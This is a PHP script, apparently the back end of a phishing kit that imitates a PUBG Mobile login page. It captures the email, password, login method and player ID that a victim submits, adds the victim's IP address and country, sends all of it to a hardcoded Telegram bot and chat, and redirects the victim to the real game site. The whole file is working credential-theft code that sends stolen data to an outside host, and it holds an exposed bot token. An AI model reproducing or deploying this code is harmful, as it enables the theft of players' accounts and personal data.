<?php
include "Nova.php";
$ip = $_SERVER['REMOTE_ADDR'];


    function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

 $ip = getUserIP();
 $ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");

$country = file_get_contents("https://ipapi.co/".$ip."/country_name");
$API_KEY = "5496059752:AAEI22HbNKImY9n2bAGiM4xU-X4eqdiEUwM";
$admin = "5108562302";
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$time = date("Y-m-d H:i:s");
$text = urlencode("
‹ 𝖧𝗂 𝖡𝗋𝗈 𝖭𝖾𝗐 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 Pubg Mobile ›
⋙ ═══════ ⋆★⋆ ═══════ ⋘
➤      𝖫𝗈𝗀𝗂𝗇 𝖡𝗒 › $login
⋙ ═══════ ⋆★⋆ ═══════ ⋘
➤ 𝖤𝗆𝖺𝗂𝗅 › `$email`
➤ 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 › `$password`
➤ 𝖢𝗈𝗎𝗇𝗍𝗋𝗒 › $country
➤ 𝖢𝗈𝗎𝗇𝗍𝗋𝗒 𝖢𝗈𝖽𝖾 › `+$ccode`
➤ 𝖨𝖯 › $ip
➤ 𝖣𝖺𝗍𝖾 › $time
➤ 𝖨𝖣 𝖯𝗅𝖺𝗒𝖾𝗋 › $playid
〄 𝖨𝗇𝖽𝖾𝗑 𝖡𝗒 › @ZbUSD | @FP_BH
⋙ ═══════ ⋆★⋆ ═══════ ⋘
");

$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
header('Location: https://pubgmobile.com');
?>